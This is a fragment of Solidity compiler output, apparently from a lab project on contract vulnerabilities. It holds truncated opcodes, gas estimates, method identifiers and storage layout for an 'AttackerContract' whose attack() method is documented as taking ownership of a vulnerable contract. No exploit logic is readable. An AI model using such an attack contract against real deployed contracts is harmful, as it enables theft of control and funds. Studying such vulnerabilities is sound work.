JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SLOAD PUSH3 0x1DE441 JUMPDEST DUP10 ADDMOD 0xC3 PUSH19 0x7EAC863423922F551E315EBE2DA3FBDA39A1B PUSH1 0x5B 0xB0 PUSH5 0x736F6C6343 STOP ADDMOD GT STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "176200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack()": "infinite",
						"vulnerableContract()": "2489"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"vulnerableContract()": "144166ae"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 63,
						"contract": "VulnerableStorageContract.sol:AttackerContract",
						"label": "vulnerableContract",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {
					"attack()": {
						"notice": "Attack the vulnerable contract to take ownership"
					}
				},
				"version": 1
			}
		}
	}
}